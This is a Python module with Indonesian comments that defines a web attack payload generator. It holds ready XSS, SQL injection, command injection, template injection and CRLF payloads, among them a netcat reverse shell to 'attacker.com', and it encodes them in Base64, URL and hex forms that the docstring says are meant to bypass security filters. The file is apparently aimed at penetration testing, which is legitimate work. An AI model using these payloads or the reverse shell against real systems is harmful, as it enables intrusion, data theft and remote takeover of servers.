import base64
import urllib.parse
from typing import Dict, List, Optional

# * Modul generator payload keamanan aplikasi web modern
class PayloadGen:
    """
    PayloadGen itu kayak pabrik senjata buat penetration testing.
    
    Dia produksi 'peluru' khusus buat nembus celah keamanan:
    
    1. XSS (Cross-Site Scripting) - Nyelipin script jahat
       - Kayak nitip pesan tersembunyi di website
       - Nanti muncul popup alert atau bisa ambil cookie user lain
    
    2. SQL Injection - Manipulasi database
       - Nyelipin perintah SQL di form login/search
       - Bisa bikin login tanpa password atau sedot semua data
    
    3. RCE (Remote Code Execution) - Jalankan perintah di server
       - Ini yang paling dangerous
       - Bisa suruh server ngelakuin apa aja (lihat file, download, dll)
    
    4. SSTI (Server-Side Template Injection) - Hack template engine
       - Manipulasi cara website nampilin data
       - Bisa eksekusi code di server
    
    5. CRLF - Inject header HTTP
       - Nambahin header palsu di response
       - Bisa buat redirect atau set cookie palsu
    
    Semua payload di-encode juga (Base64, URL encode) 
    biar bisa bypass filter keamanan!
    """
    def __init__(self):
        self.templates: Dict[str, List[str]] = {
            "xss": [
                "<script>alert(1)</script>",
                "\"><script>alert(1)</script>",
                "<svg/onload=alert(1)>",
                "javascript:alert(1)"
            ],
            "sqli": [
                "' OR 1=1--",
                "admin' --",
                "' UNION SELECT 1,2,3--",
                "\" OR \"a\"=\"a"
            ],
            "rce": [
                "; id",
                "| whoami",
                "`sleep 5`",
                "$(nc -e /bin/sh attacker.com 1337)"
            ],
            "ssti": [
                "{{7*7}}",
                "${7*7}",
                "<%= 7*7 %>",
                "#{7*7}"
            ],
            "crlf": [
                "%0d%0aSet-Cookie:crlf=1",
                "\\r\\nLocation: http://attacker.com"
            ]
        }

    def generateEncodedPayloads(self, vulnerability: str) -> Dict[str, Dict[str, str]]:
        """Hasil generator auto-encoding untuk tipe payload tertentu.
        
        Args:
            vulnerability: Tipe kerentanan (xss, sqli, rce, ssti, crlf).
            
        Returns:
            Dictionary payload mentah beserta versi hasil encode-nya (Base64, URL Encode).
        """
        results = {}
        vulnType = vulnerability.lower()
        
        if vulnType not in self.templates:
            return results
            
        payload_list = self.templates[vulnType]
        for index, text in enumerate(payload_list):
            try:
                b64 = base64.b64encode(text.encode("utf-8")).decode("utf-8")
                url_enc = urllib.parse.quote(text)
                
                results[f"payload_{index+1}"] = {
                    "raw": text,
                    "base64": b64,
                    "urlencode": url_enc
                }
            except Exception:
                pass
                
        return results

    def generate(self, text: str) -> Dict[str, str]:
        """Hasil generator auto-encoding untuk teks bebas (v6.3.1).
        
        Args:
            text: Teks payload mentah kustom.
            
        Returns:
            Dictionary hasil berbagai varian encoding.
        """
        return {
            "Raw": text,
            "Base64": self.customEncode(text, "base64") or "Error",
            "URL": self.customEncode(text, "url") or "Error",
            "Hex": self.customEncode(text, "hex") or "Error",
            "HTML": self.customEncode(text, "html") or "Error"
        }

    def customEncode(self, text: str, mode: str = "base64") -> Optional[str]:
        """Lakukan enkoding manual string ke mode tertentu.
        
        Args:
            text: Teks payload mentah.
            mode: Ekonding format seperti (base64, hex, url, html).
            
        Returns:
            String hasil enkoding atau None jika error.
        """
        try:
            mode = mode.lower()
            if mode == "base64":
                return base64.b64encode(text.encode("utf-8")).decode("utf-8")
            elif mode == "hex":
                return text.encode("utf-8").hex()
            elif mode == "url":
                return urllib.parse.quote(text)
            elif mode == "html":
                return text.replace("<", "&lt;").replace(">", "&gt;").replace("\"", "&quot;")
            return None
        except Exception:
            return None

    def customDecode(self, text: str, format_type: str = "base64") -> Optional[str]:
        """Dekoding payload tersandikan kembali ke bentuk mentah.
        
        Args:
            text: Teks berenkoding (contoh base64).
            format_type: Ekonding format sumber.
            
        Returns:
            String hasil dekoding atau None jika error.
        """
        try:
            format_type = format_type.lower()
            if format_type == "base64":
                return base64.b64decode(text).decode("utf-8")
            elif format_type == "hex":
                return bytes.fromhex(text).decode("utf-8")
            elif format_type == "url":
                return urllib.parse.unquote(text)
            return None
        except Exception:
            return None
